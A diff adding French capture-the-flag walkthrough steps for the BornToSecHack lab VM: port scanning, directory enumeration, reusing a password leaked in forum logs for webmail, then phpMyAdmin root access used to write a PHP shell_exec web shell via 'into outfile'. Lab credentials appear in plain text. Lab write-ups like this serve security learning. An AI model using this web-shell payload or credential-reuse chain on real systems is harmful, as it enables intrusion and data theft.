@@ -1,6 +1,32 @@
+La permiere etape est de retrouver l'ip de la vm de notre os et les ports ouverts. Pour ça, deux solutions :
+
+Solution 1:
+  ------------------------------------------------------------------------
+
+➜ ~ VBoxManage guestproperty get BornToSecHack "/VirtualBox/GuestInfo/Net/0/V4/IP"
+Value: 10.11.200.67
+➜ ~ nmap -n -sV 10.11.200.67
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-25 08:43 EDT
+Nmap scan report for 10.11.200.67
+Host is up (0.00057s latency).
+Not shown: 994 closed ports
+PORT    STATE SERVICE    VERSION
+21/tcp  open  ftp        vsftpd 2.0.8 or later
+22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
+143/tcp open  imap       Dovecot imapd
+443/tcp open  ssl/http   Apache httpd 2.2.22
+993/tcp open  ssl/imaps?
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+  ------------------------------------------------------------------------
 
 
-Sur un VM Debian, j'utilise la commande "ip addrr" pour trouver mon ip.
+
+
+Solution 2:
+
+Sur une VM Debian, j'utilise la commande "ip addrr" pour trouver mon ip.
 
 
   ------------------------------------------------------------------------
@@ -18,6 +44,84 @@ mmartins@debian:~$ ip addr
        valid_lft 4477sec preferred_lft 4477sec
     inet6 fe80::a00:27ff:fed5:a2fd/64 scope link
        valid_lft forever preferred_lft forever
+       
+mmartins@debian:~$ nmap -n -sV 10.11.200.1-254
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-25 08:20 EDT
+Nmap scan report for 10.11.200.4
+Host is up (0.0010s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for 10.11.200.67
+Host is up (0.0017s latency).
+Not shown: 994 closed ports
+PORT    STATE SERVICE    VERSION
+21/tcp  open  ftp        vsftpd 2.0.8 or later
+22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
+143/tcp open  imap       Dovecot imapd
+443/tcp open  ssl/http   Apache httpd 2.2.22
+993/tcp open  ssl/imaps?
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
   ------------------------------------------------------------------------
 
+
+Ensuite on utilise "dirb" pour analyser toutes les uri possibles 
+
+  ------------------------------------------------------------------------
+
+mmartins@debian:~$ dirb https://10.11.200.67 | grep DIRECTORY
+==> DIRECTORY: https://10.11.200.67/forum/
+==> DIRECTORY: https://10.11.200.67/phpmyadmin/
+==> DIRECTORY: https://10.11.200.67/webmail/
+==> DIRECTORY: https://10.11.200.67/forum/images/
+==> DIRECTORY: https://10.11.200.67/forum/includes/
+==> DIRECTORY: https://10.11.200.67/forum/js/
+==> DIRECTORY: https://10.11.200.67/forum/lang/
+==> DIRECTORY: https://10.11.200.67/forum/modules/
+==> DIRECTORY: https://10.11.200.67/forum/templates_c/
+==> DIRECTORY: https://10.11.200.67/forum/themes/
+==> DIRECTORY: https://10.11.200.67/forum/update/
+...
+
+  ------------------------------------------------------------------------
+
+Maintenant on va essayer ces urls dans un navigateur.
+Sur "https://10.11.200.67/forum/" on trouve un sujet interessant : "probleme login ?" posté par "lmezard" avec des log.
+En lisant un peu ces logs, on peut voir une ligne surprenante :
+  ------------------------------------------------------------------------
+Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
+  ------------------------------------------------------------------------
+  
+ invalid user ?! l'utilisateur aurait-il taper son password au lieu de son login ?!
+ Essayons !   => Ça fonctionne !
+ En allant sur la page perso de lmezard on accede a certaines données comme son adresse mail : "laurie@borntosec.net"
+ Allons essayer ça sur "https://10.11.200.67/webmail/" avec le même mot de passe => Ça fonctionne encore !!
+ En explorant les emails reçus et envoyés, un des sujets attire notre attention : "DB Access" =>
+   ------------------------------------------------------------------------
+ Hey Laurie,
+
+You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+
+Best regards.
+  ------------------------------------------------------------------------
+ Super, un password pour le user root de la db !
+ 
+ Allons sur "https://10.11.200.67/phpmyadmin/"
+ Parfait, maintenant nous avons un accés root sur phpmyadmin, nous allons pouvoir essayer de faire des Local File Inclusion(LFI).
+ Voici un petit article qui nous a aidé a comprendre les LFI : "http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2"
+ Aprés quelques tests, nous avons remarqué que nous pouvions inserer des fichier dans "/forum/templates_c/"
+ 
+ ```
+ select "<?php $output = shell_exec('cat /home/LOOKATME/password'); echo $output ?>" into outfile "/var/www/forum/templates_c/LFI.php"
+ ```
+ Ensuite il faut donc se rendre a l'url suivante "https://10.11.200.67/forum/templates_c/LFI.php" pour obtenir : lmezard:G!@M6f4Eatau{sF"
+ 
+ Voila, nous avons un accés à la machine :).
+ 
+ 
+ 
